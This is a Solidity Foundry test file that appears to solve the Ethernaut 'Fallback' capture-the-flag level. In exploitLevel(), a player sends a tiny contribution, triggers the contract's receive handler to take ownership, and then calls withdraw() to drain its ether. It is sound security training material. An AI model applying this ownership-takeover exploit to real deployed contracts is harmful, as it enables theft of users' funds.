// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallback.sol";
import "src/levels/FallbackFactory.sol";
import "forge-std/console2.sol";

contract TestFallback is BaseTest {
    Fallback private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FallbackFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Fallback(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        /** CODE YOUR EXPLOIT HERE */
        // send the minimum amount to become a contributor
        emit log_named_address("Owner", level.owner());
        emit log_named_uint("Owner balance", address(level).balance);
        emit log_named_address("Player", player);
        emit log_named_uint("Player balance", player.balance);
        level.contribute{value: 1 wei}();

        emit log_named_uint("Contributions", level.getContribution());
        emit log_named_address("Owner", level.owner());

        // this calls default receive handler in the contract
        // see more here: https://solidity-by-example.org/sending-ether/
        address(level).call{value: 1 wei}("");
        emit log_named_address("New owner", level.owner());

        // now let's empty that contract :-) as we are the new owner
        level.withdraw();
        emit log_named_uint("New balance", player.balance);

        vm.stopPrank();
    }
}
